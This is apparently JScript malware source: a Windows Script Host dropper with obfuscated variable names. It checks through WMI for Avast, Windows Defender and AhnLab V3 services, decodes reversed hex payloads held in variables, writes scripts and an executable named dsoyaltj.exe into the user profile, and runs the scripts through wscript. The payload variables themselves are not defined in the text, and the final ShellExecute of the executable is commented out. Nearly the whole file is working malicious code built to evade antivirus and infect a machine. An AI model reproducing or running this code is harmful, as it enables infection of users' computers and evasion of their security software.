var bewktojmagvc = new ActiveXObject('Scripting.FileSystemObject');
var zevdbpspf = WScript.CreateObject("WScript.Shell");
var malScriptPath = zevdbpspf.ExpandEnvironmentStrings("%USERPROFILE%") + "\\";
var stwnydqsuji = WScript.CreateObject("shell.application");

function decryptAndDrop(ecryptedPayload, outputFileName) {
  // decrypt and drop the payload
  var ecryptedPayloadClean = ecryptedPayload.split("").reverse().join("");
  decyptedPayload = '';
  for (i = 0; i < (ecryptedPayloadClean.length / 2); i++) {
    decyptedPayload += String.fromCharCode('0x' + ecryptedPayloadClean.substr(i * 2, 2));
  }
  var payloadFile = new ActiveXObject("ADODB.Stream");
  payloadFile.Type = 2;
  payloadFile.Charset = "ISO-8859-1";
  payloadFile.Open();
  payloadFile.WriteText(decyptedPayload);
  payloadFile.SaveToFile(outputFileName, 2);
  payloadFile.Close();
}

function runShellCommand(shellCommand) {
  var osShell = WScript.CreateObject("WScript.Shell");
  var cmdResponse = osShell.Exec(shellCommand);
  var i = 0;
  while (true) {
    if (cmdResponse.Status == 0) {
      WScript.Sleep(100);
      i++;
    } else {
      break;
    }
    if (i == 1800) {
      cmdResponse.Terminate();
      break;
    }
  }
}

function getServiceStatus(serviceName) {
  // gets all the service passed in the parameter
  var serviceObj = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Service WHERE Name='" + serviceName + "'");
  vaatgfp = new Enumerator(serviceObj);
  xcabb = vaatgfp.item();
  var bfdln = '';
  try {
    bfdln = xcabb.State;
  } catch (e) {}
  if (bfdln == 'Running') {
    return true;
  } else {
    return false;
  }
}
if (getServiceStatus('avast! Antivirus')) {
  decryptAndDrop(pjqssmaj, malScriptPath + 'kyoxks.js');
  try {
    runShellCommand('wscript.exe "' + malScriptPath + 'kyoxks.js"');
  } catch (e) {}
  WScript.sleep(15000);
}
if ((getServiceStatus('WdNisSvc')) || (getServiceStatus('WinDefend'))) {
  decryptAndDrop(wvspotnpwm, malScriptPath + 'nykvwcajm.js');
  try {
    runShellCommand('wscript.exe "' + malScriptPath + 'nykvwcajm.js"');
  } catch (e) {}
}
if (getServiceStatus('NisSrv')) {
  decryptAndDrop(hoszxms, malScriptPath + 'bervcptyvulur.js');
  try {
    runShellCommand('wscript.exe "' + malScriptPath + 'bervcptyvulur.js"');
  } catch (e) {}
}
if (getServiceStatus('V3 Service')) {
  if (bewktojmagvc.FileExists(malScriptPath + "tgydmilslvp.txt")) {
    decryptAndDrop(mvqwaqu, malScriptPath + 'recjyzcz.js');
    try {
      runShellCommand('wscript.exe "' + malScriptPath + 'recjyzcz.js"');
    } catch (e) {}
  } else {
    decryptAndDrop('727272', malScriptPath + 'tgydmilslvp.txt');
    try {
      runShellCommand('wscript.exe "' + WScript.ScriptFullName + '"');
    } catch (e) {}
    WScript.Quit();
  }
}
decryptAndDrop(xtaqukamdxzx, malScriptPath + 'dsoyaltj.exe');
if (bewktojmagvc.FileExists(malScriptPath + "dsoyaltj.exe")) {
  try {
    // stwnydqsuji.ShellExecute('"' + malScriptPath + "dsoyaltj.exe" + '"', '', "", "open", 1);
  } catch (e) {}
}
